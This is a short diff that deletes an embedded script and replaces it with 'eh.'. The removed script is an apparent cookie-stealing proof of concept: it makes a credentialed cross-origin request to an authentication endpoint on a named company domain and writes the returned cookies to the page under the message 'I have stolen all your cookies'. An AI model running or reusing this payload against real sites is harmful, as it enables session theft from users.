@@ -1,15 +1,1 @@
-<script>
-
-
-var getcookie = new XMLHttpRequest();
-var url = "https://auth.ct2.dv.aligntech.com/whoami?Access-Control-Expose-Headers=Cookie";
-
-getcookie.onreadystatechange= function(){
-  if(getcookie.readyState == getcookie.DONE) {
-   document.write(getcookie.getResponseHeader("Cookie") + "<h1>I have stolen all your cookies");
-}}
-
-getcookie.open("GET",url,true);
-getcookie.withCredentials = true;
-getcookie.send();
-</script>
+eh.
